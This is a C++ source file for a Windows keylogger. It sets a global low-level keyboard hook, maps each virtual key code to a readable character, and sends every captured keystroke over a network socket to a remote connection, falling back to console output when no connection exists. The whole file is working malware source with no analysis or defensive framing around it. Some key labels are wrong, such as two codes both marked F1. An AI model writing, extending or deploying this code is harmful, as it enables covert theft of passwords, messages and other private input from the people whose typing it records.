#include <winsock2.h>  
#include <windows.h>
#include <iostream>
#include "connection.h"
#include "hooks.h"

using namespace std;

const unordered_map<DWORD, string> shiftKeyMap = {
    {0x30, ")"}, {0x31, "!"}, {0x32, "@"}, {0x33, "#"}, {0x34, "$"},
    {0x35, "%"}, {0x36, "^"}, {0x37, "&"}, {0x38, "*"}, {0x39, "("},
    {0x41, "A"}, {0x42, "B"}, {0x43, "C"}, {0x44, "D"}, {0x45, "E"},
    {0x46, "F"}, {0x47, "G"}, {0x48, "H"}, {0x49, "I"}, {0x4A, "J"},
    {0x4B, "K"}, {0x4C, "L"}, {0x4D, "M"}, {0x4E, "N"}, {0x4F, "O"},
    {0x50, "P"}, {0x51, "Q"}, {0x52, "R"}, {0x53, "S"}, {0x54, "T"},
    {0x55, "U"}, {0x56, "V"}, {0x57, "W"}, {0x58, "X"}, {0x59, "Y"},
    {0x5A, "Z"},
    {0xBA, ":"}, {0xBB, "+"}, {0xBC, "<"}, {0xBE, ">"}, {0xBF, "?"},
    {0xDB, "{"}, {0xDC, "|"}, {0xDD, "}"}, {0xDE, "\""}, {0xE2, "|"},
    {0xC0, "~"}, {0xBD, "_"},
    {0x8, " [BACKSPACE] "}, {0xD, " [ENTER] "}, {0x9, " [TAB] "},
    {0x14, " [CAPSLOCK] "}, {0x11, " [CTRL] "}, {0x12, " [ALT] "},
    {0x1B, " [ESC] "}, {0x20, " [SPACE] "}, {0x25, " [LEFT ARROW] "},
    {0x26, " [UP ARROW] "}, {0x27, " [RIGHT ARROW] "}, {0x28, " [DOWN ARROW] "},
    {0x2E, " [DEL] "}, {0x2D, " [INSERT] "}, {0x2A, " [PRINTSCREEN] "},
    {0x70, " [F1] "}, {0x71, " [F1] "}, {0x72, " [F2] "}, {0x73, " [F3] "},
    {0x74, " [F4] "}, {0x75, " [F5] "}, {0x76, " [F6] "}, {0x77, " [F7] "},
    {0x78, " [F8] "}, {0x79, " [F9] "}, {0x7A, " [F10] "}, {0x7B, " [F11] "},
    {0x7C, " [F12] "},
    {0x5B, " [LEFT WINDOWS KEY] "}, {0x5C, " [LEFT WINDOWS KEY] "}
};

const unordered_map<DWORD, string> noShiftKeyMap = {
    {0x30, "0"}, {0x31, "1"}, {0x32, "2"}, {0x33, "3"}, {0x34, "4"},
    {0x35, "5"}, {0x36, "6"}, {0x37, "7"}, {0x38, "8"}, {0x39, "9"},
    {0x41, "a"}, {0x42, "b"}, {0x43, "c"}, {0x44, "d"}, {0x45, "e"},
    {0x46, "f"}, {0x47, "g"}, {0x48, "h"}, {0x49, "i"}, {0x4A, "j"},
    {0x4B, "k"}, {0x4C, "l"}, {0x4D, "m"}, {0x4E, "n"}, {0x4F, "o"},
    {0x50, "p"}, {0x51, "q"}, {0x52, "r"}, {0x53, "s"}, {0x54, "t"},
    {0x55, "u"}, {0x56, "v"}, {0x57, "w"}, {0x58, "x"}, {0x59, "y"},
    {0x5A, "z"},
    {0xBA, ";"}, {0xBB, "="}, {0xBC, ","}, {0xBE, "."}, {0xBF, "/"},
    {0xDB, "["}, {0xDC, "\\"}, {0xDD, "]"}, {0xDE, "'"}, {0xE2, "\\"},
    {0xC0, "`"}, {0xBD, "-"},
    {0x8, " [BACKSPACE] "}, {0xD, " [ENTER] "}, {0x9, " [TAB] "},
    {0x14, " [CAPSLOCK] "}, {0x11, " [CTRL] "}, {0x12, " [ALT] "},
    {0x1B, " [ESC] "}, {0x20, " [SPACE] "}, {0x25, " [LEFT ARROW] "},
    {0x26, " [UP ARROW] "}, {0x27, " [RIGHT ARROW] "}, {0x28, " [DOWN ARROW] "},
    {0x2E, " [DEL] "}, {0x2D, " [INSERT] "}, {0x2A, " [PRINTSCREEN] "},
    {0x70, " [F1] "}, {0x71, " [F1] "}, {0x72, " [F2] "}, {0x73, " [F3] "},
    {0x74, " [F4] "}, {0x75, " [F5] "}, {0x76, " [F6] "}, {0x77, " [F7] "},
    {0x78, " [F8] "}, {0x79, " [F9] "}, {0x7A, " [F10] "}, {0x7B, " [F11] "},
    {0x7C, " [F12] "},
    {0x5B, " [LEFT WINDOWS KEY] "}, {0x5C, " [LEFT WINDOWS KEY] "}
};

HHOOK kHook;
HHOOK mHook;
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;

        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        const unordered_map<DWORD, string>& keyMap = shiftPressed ? shiftKeyMap : noShiftKeyMap;

        auto it = keyMap.find(vkCode);
        if (it != keyMap.end()) {
            const string& output = it->second;
            if (ConnectSocket != INVALID_SOCKET) {
                int sendResult = send(ConnectSocket, output.c_str(), (int)output.size(), 0);
                if (sendResult == SOCKET_ERROR) {
                    cerr << "send failed: " << WSAGetLastError();
                }
            }
            else {
                cout << output;
            }
        }
    }
    return CallNextHookEx(kHook, nCode, wParam, lParam);
}

bool installHooks() {
    kHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    return kHook;
}

void uninstallHooks() {
    UnhookWindowsHookEx(kHook);
}